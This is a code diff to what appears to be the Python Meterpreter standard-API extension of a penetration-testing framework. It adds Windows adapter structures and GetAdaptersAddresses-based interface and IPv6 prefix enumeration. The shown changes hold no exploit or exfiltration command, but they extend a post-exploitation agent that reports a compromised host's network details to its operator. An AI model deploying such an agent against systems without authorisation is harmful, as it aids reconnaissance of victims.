@@ -40,6 +40,87 @@ except ImportError:
 #
 # Windows Structures
 #
+class SOCKADDR(ctypes.Structure):
+	_fields_ = [("sa_family", ctypes.c_ushort),
+		("sa_data", (ctypes.c_uint8 * 14))]
+
+class SOCKET_ADDRESS(ctypes.Structure):
+	_fields_ = [("lpSockaddr", ctypes.POINTER(SOCKADDR)),
+		("iSockaddrLength", ctypes.c_int)]
+
+class IP_ADAPTER_UNICAST_ADDRESS(ctypes.Structure):
+	_fields_ = [
+		("s", type(
+				'_s_IP_ADAPTER_UNICAST_ADDRESS',
+				(ctypes.Structure,),
+				dict(_fields_ = [
+					("Length", ctypes.c_ulong),
+					("Flags", ctypes.c_uint32)
+				])
+		)),
+		("Next", ctypes.c_void_p),
+		("Address", SOCKET_ADDRESS),
+		("PrefixOrigin", ctypes.c_uint32),
+		("SuffixOrigin", ctypes.c_uint32),
+		("DadState", ctypes.c_uint32),
+		("ValidLifetime", ctypes.c_ulong),
+		("PreferredLifetime", ctypes.c_ulong),
+		("LeaseLifetime", ctypes.c_ulong),
+		("OnLinkPrefixLength", ctypes.c_uint8)]
+
+class IP_ADAPTER_ADDRESSES(ctypes.Structure):
+	_fields_ = [
+		("u", type(
+			'_u_IP_ADAPTER_ADDRESSES',
+			(ctypes.Union,),
+			dict(_fields_ = [
+				("Alignment", ctypes.c_ulonglong),
+				("s", type(
+					'_s_IP_ADAPTER_ADDRESSES',
+					(ctypes.Structure,),
+					dict(_fields_ = [
+						("Length", ctypes.c_ulong),
+						("IfIndex", ctypes.c_uint32)
+					])
+				))
+			])
+		)),
+		("Next", ctypes.c_void_p),
+		("AdapterName", ctypes.c_char_p),
+		("FirstUnicastAddress", ctypes.c_void_p),
+		("FirstAnycastAddress", ctypes.c_void_p),
+		("FirstMulticastAddress", ctypes.c_void_p),
+		("FirstDnsServerAddress", ctypes.c_void_p),
+		("DnsSuffix", ctypes.c_wchar_p),
+		("Description", ctypes.c_wchar_p),
+		("FriendlyName", ctypes.c_wchar_p),
+		("PhysicalAddress", (ctypes.c_uint8 * 8)),
+		("PhysicalAddressLength", ctypes.c_uint32),
+		("Flags", ctypes.c_uint32),
+		("Mtu", ctypes.c_uint32),
+		("IfType", ctypes.c_uint32),
+		("OperStatus", ctypes.c_uint32),
+		("Ipv6IfIndex", ctypes.c_uint32),
+		("ZoneIndices", (ctypes.c_uint32 * 16)),
+		("FirstPrefix", ctypes.c_void_p),
+		("TransmitLinkSpeed", ctypes.c_uint64),
+		("ReceiveLinkSpeed", ctypes.c_uint64),
+		("FirstWinsServerAddress", ctypes.c_void_p),
+		("FirstGatewayAddress", ctypes.c_void_p),
+		("Ipv4Metric", ctypes.c_ulong),
+		("Ipv6Metric", ctypes.c_ulong),
+		("Luid", ctypes.c_uint64),
+		("Dhcpv4Server", SOCKET_ADDRESS),
+		("CompartmentId", ctypes.c_uint32),
+		("NetworkGuid", (ctypes.c_uint8 * 16)),
+		("ConnectionType", ctypes.c_uint32),
+		("TunnelType", ctypes.c_uint32),
+		("Dhcpv6Server", SOCKET_ADDRESS),
+		("Dhcpv6ClientDuid", (ctypes.c_uint8 * 130)),
+		("Dhcpv6ClientDuidLength", ctypes.c_ulong),
+		("Dhcpv6Iaid", ctypes.c_ulong),
+		("FirstDnsSuffix", ctypes.c_void_p)]
+
 class MIB_IFROW(ctypes.Structure):
 	_fields_ = [("wszName", (ctypes.c_wchar * 256)),
 		("dwIndex", ctypes.c_uint32),
@@ -207,11 +288,13 @@ TLV_TYPE_SUBNET                = TLV_META_TYPE_RAW     | 1420
 TLV_TYPE_NETMASK               = TLV_META_TYPE_RAW     | 1421
 TLV_TYPE_GATEWAY               = TLV_META_TYPE_RAW     | 1422
 TLV_TYPE_NETWORK_ROUTE         = TLV_META_TYPE_GROUP   | 1423
+TLV_TYPE_IP_PREFIX             = TLV_META_TYPE_UINT    | 1424
 
 TLV_TYPE_IP                    = TLV_META_TYPE_RAW     | 1430
 TLV_TYPE_MAC_ADDRESS           = TLV_META_TYPE_RAW     | 1431
 TLV_TYPE_MAC_NAME              = TLV_META_TYPE_STRING  | 1432
 TLV_TYPE_NETWORK_INTERFACE     = TLV_META_TYPE_GROUP   | 1433
+TLV_TYPE_IP6_SCOPE             = TLV_META_TYPE_RAW     | 1434
 
 TLV_TYPE_SUBNET_STRING         = TLV_META_TYPE_STRING  | 1440
 TLV_TYPE_NETMASK_STRING        = TLV_META_TYPE_STRING  | 1441
@@ -358,6 +441,11 @@ ERROR_FAILURE = 1
 ERROR_CONNECTION_ERROR = 10000
 
 # Windows Constants
+GAA_FLAG_SKIP_ANYCAST    = 0x0002
+GAA_FLAG_SKIP_MULTICAST  = 0x0004
+GAA_FLAG_INCLUDE_PREFIX  = 0x0010
+GAA_FLAG_SKIP_DNS_SERVER = 0x0080
+
 WIN_AF_INET  = 2
 WIN_AF_INET6 = 23
 
@@ -373,9 +461,6 @@ IFLA_MTU       = 4
 
 IFA_ADDRESS    = 1
 IFA_LABEL      = 3
-
-def cstruct_pack(structure):
-	return ctypes.string_at(ctypes.byref(structure), ctypes.sizeof(structure))
 
 def cstruct_unpack(structure, raw_data):
 	if not isinstance(structure, ctypes.Structure):
@@ -452,6 +537,15 @@ def windll_GetNativeSystemInfo():
 	sysinfo = SYSTEM_INFO()
 	ctypes.windll.kernel32.GetNativeSystemInfo(ctypes.byref(sysinfo))
 	return {0:PROCESS_ARCH_X86, 6:PROCESS_ARCH_IA64, 9:PROCESS_ARCH_X64}.get(sysinfo.wProcessorArchitecture, PROCESS_ARCH_UNKNOWN)
+
+def windll_GetVersion():
+	if not has_windll:
+		return None
+	dwVersion = ctypes.windll.kernel32.GetVersion()
+	dwMajorVersion =  (dwVersion & 0x000000ff)
+	dwMinorVersion = ((dwVersion & 0x0000ff00) >> 8)
+	dwBuild        = ((dwVersion & 0xffff0000) >> 16)
+	return type('Version', (object,), dict(dwMajorVersion = dwMajorVersion, dwMinorVersion = dwMinorVersion, dwBuild = dwBuild))
 
 @meterpreter.register_function
 def channel_create_stdapi_fs_file(request, response):
@@ -860,7 +954,7 @@ def stdapi_net_config_get_interfaces(request, response):
 	if hasattr(socket, 'AF_NETLINK'):
 		interfaces = stdapi_net_config_get_interfaces_via_netlink()
 	elif has_windll:
-		interfaces = stdapi_net_config_get_interfaces_via_windll_mib()
+		interfaces = stdapi_net_config_get_interfaces_via_windll()
 	else:
 		return ERROR_FAILURE, response
 	for iface_info in interfaces:
@@ -874,7 +968,10 @@ def stdapi_net_config_get_interfaces(request, response):
 		iface_tlv += tlv_pack(TLV_TYPE_INTERFACE_INDEX, iface_info['index'])
 		for address in iface_info.get('addrs', []):
 			iface_tlv += tlv_pack(TLV_TYPE_IP, address[1])
-			iface_tlv += tlv_pack(TLV_TYPE_NETMASK, address[2])
+			if isinstance(address[2], (int, long)):
+				iface_tlv += tlv_pack(TLV_TYPE_IP_PREFIX, address[2])
+			else:
+				iface_tlv += tlv_pack(TLV_TYPE_NETMASK, address[2])
 		response += tlv_pack(TLV_TYPE_NETWORK_INTERFACE, iface_tlv)
 	return ERROR_SUCCESS, response
 
@@ -952,6 +1049,57 @@ def stdapi_net_config_get_interfaces_via_netlink():
 				iface_info['name'] = attr_data
 		interfaces[iface.index] = iface_info
 	return interfaces.values()
+
+def stdapi_net_config_get_interfaces_via_windll():
+	iphlpapi = ctypes.windll.iphlpapi
+	if not hasattr(iphlpapi, 'GetAdaptersAddresses'):
+		return stdapi_net_config_get_interfaces_via_windll_mib()
+	Flags = (GAA_FLAG_INCLUDE_PREFIX | GAA_FLAG_SKIP_DNS_SERVER | GAA_FLAG_SKIP_MULTICAST | GAA_FLAG_SKIP_ANYCAST)
+	AdapterAddresses = ctypes.c_void_p()
+	SizePointer = ctypes.c_ulong()
+	SizePointer.value = 0
+	iphlpapi.GetAdaptersAddresses(socket.AF_UNSPEC, Flags, None, AdapterAddresses, ctypes.byref(SizePointer))
+	AdapterAddressesData = (ctypes.c_uint8 * SizePointer.value)()
+	iphlpapi.GetAdaptersAddresses(socket.AF_UNSPEC, Flags, None, ctypes.byref(AdapterAddressesData), ctypes.byref(SizePointer))
+	AdapterAddresses = ctypes.string_at(ctypes.byref(AdapterAddressesData), SizePointer.value)
+	AdapterAddresses = cstruct_unpack(IP_ADAPTER_ADDRESSES, AdapterAddresses)
+	if AdapterAddresses.u.s.Length <= 72:
+		return stdapi_net_config_get_interfaces_via_windll_mib()
+	win_version = windll_GetVersion()
+	interfaces = []
+	pAdapterAddresses = ctypes.byref(AdapterAddresses)
+	while pAdapterAddresses:
+		AdapterAddresses = cstruct_unpack(IP_ADAPTER_ADDRESSES, pAdapterAddresses)
+		pAdapterAddresses = AdapterAddresses.Next
+		pFirstPrefix = AdapterAddresses.FirstPrefix
+		iface_info = {}
+		iface_info['index'] = AdapterAddresses.u.s.IfIndex
+		if AdapterAddresses.PhysicalAddressLength:
+			iface_info['hw_addr'] = ctypes.string_at(ctypes.byref(AdapterAddresses.PhysicalAddress), AdapterAddresses.PhysicalAddressLength)
+		iface_info['name'] = str(ctypes.wstring_at(AdapterAddresses.Description))
+		iface_info['mtu'] = AdapterAddresses.Mtu
+		pUniAddr = AdapterAddresses.FirstUnicastAddress
+		while pUniAddr:
+			UniAddr = cstruct_unpack(IP_ADAPTER_UNICAST_ADDRESS, pUniAddr)
+			pUniAddr = UniAddr.Next
+			address = cstruct_unpack(SOCKADDR, UniAddr.Address.lpSockaddr)
+			if not address.sa_family in (socket.AF_INET, socket.AF_INET6):
+				continue
+			prefix = 0
+			if win_version.dwMajorVersion >= 6:
+				prefix = UniAddr.OnLinkPrefixLength
+			elif pFirstPrefix:
+				ip_adapter_prefix = 'QPPIL'
+				prefix_data = ctypes.string_at(pFirstPrefix, struct.calcsize(ip_adapter_prefix))
+				prefix = struct.unpack(ip_adapter_prefix, prefix_data)[4]
+			iface_addresses = iface_info.get('addrs', [])
+			if address.sa_family == socket.AF_INET:
+				iface_addresses.append((socket.AF_INET, ctypes.string_at(ctypes.byref(address.sa_data), 6)[2:], prefix))
+			else:
+				iface_addresses.append((socket.AF_INET6, ctypes.string_at(ctypes.byref(address.sa_data), 22)[6:], prefix))
+			iface_info['addrs'] = iface_addresses
+		interfaces.append(iface_info)
+	return interfaces
 
 def stdapi_net_config_get_interfaces_via_windll_mib():
 	iphlpapi = ctypes.windll.iphlpapi
